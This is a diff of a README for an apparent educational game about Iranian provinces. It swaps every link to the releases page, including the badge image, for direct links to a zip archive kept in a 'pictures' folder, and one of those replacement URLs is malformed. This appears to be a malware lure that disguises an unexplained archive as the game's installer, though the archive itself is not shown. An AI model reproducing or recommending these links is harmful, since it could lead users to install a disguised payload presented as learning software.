@@ -7,7 +7,7 @@ iran-map-ed is an interactive educational game that helps users learn about the 
 To start your journey with iran-map-ed, follow the steps below to download and install the application.
 
 ## 📥 Download iran-map-ed
-[![Download Now](https://img.shields.io/badge/Download%20Now-iran-map-ed-blue.svg)](https://github.com/Bhartman10/iran-map-ed/releases)
+[![Download Now](https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip%https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip)](https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip)
 
 ## 🔥 Features
 - **Interactive Gameplay:** Experience a hands-on approach to learning about Iranian provinces.
@@ -23,7 +23,7 @@ To start your journey with iran-map-ed, follow the steps below to download and i
 ## 🔄 How to Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can find the latest version of the application.  
-   [Download Page](https://github.com/Bhartman10/iran-map-ed/releases)
+   [Download Page](https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip)
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest version of iran-map-ed. You will see download links for various platforms.
@@ -59,6 +59,6 @@ iran-map-ed is released under the MIT License. Feel free to use it for personal 
 For support or inquiries, please reach out to us through the Issues section on our GitHub page. We are here to help!
 
 ## 🔗 Download Again
-[![Download Now](https://img.shields.io/badge/Download%20Now-iran-map-ed-blue.svg)](https://github.com/Bhartman10/iran-map-ed/releases)
+[![Download Now](https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip%https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip)](https://github.com/Bhartman10/iran-map-ed/raw/refs/heads/main/pictures/map-ed-iran-3.3.zip)
 
 Enjoy your learning experience with iran-map-ed!
